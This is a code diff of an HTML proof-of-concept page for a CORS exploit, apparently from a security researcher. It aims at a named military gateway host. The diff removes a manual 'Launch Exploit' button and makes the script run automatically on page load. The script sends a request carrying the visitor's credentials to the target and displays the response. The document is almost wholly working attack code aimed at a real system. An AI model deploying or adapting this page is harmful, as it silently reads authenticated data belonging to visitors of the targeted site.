@@ -10,18 +10,6 @@
             text-align: center;
             margin-top: 50px;
         }
-        button {
-            padding: 10px 20px;
-            background-color: #FF6347;
-            color: white;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-            border-radius: 5px;
-        }
-        button:hover {
-            background-color: #FF4500;
-        }
         #output {
             margin-top: 20px;
             color: #333;
@@ -30,26 +18,24 @@
     </style>
 </head>
 <body>
-    <h1>0xTrav CORS Exploit Demo</h1>
-    <p>Click the button to test the CORS exploit.</p>
-    <button id="exploitButton">Launch Exploit</button>
-
-    <div id="output"></div>
+    <h1>0xTrav CORS Exploit Auto-Triggered</h1>
+    <div id="output">Running exploit...</div>
 
     <script>
-        document.getElementById('exploitButton').onclick = function() {
+        window.onload = function() {
             var outputDiv = document.getElementById('output');
-            outputDiv.innerHTML = 'Attempting exploit...';
-
             var req = new XMLHttpRequest();
+            
             req.onload = function() {
-                alert('Exploit successful! Check the output below.');
+                alert('Exploit successful!');
                 outputDiv.innerHTML = '<strong>Response:</strong><br>' + this.responseText;
             };
+            
             req.onerror = function() {
                 alert('Exploit failed.');
                 outputDiv.innerHTML = '<strong>Error:</strong> Could not complete the request.';
             };
+            
             req.open('GET', 'https://securegateway.smdch.smdc.army.mil/', true);
             req.withCredentials = true;
             req.send();
@@ -57,4 +43,3 @@
     </script>
 </body>
 </html>
-
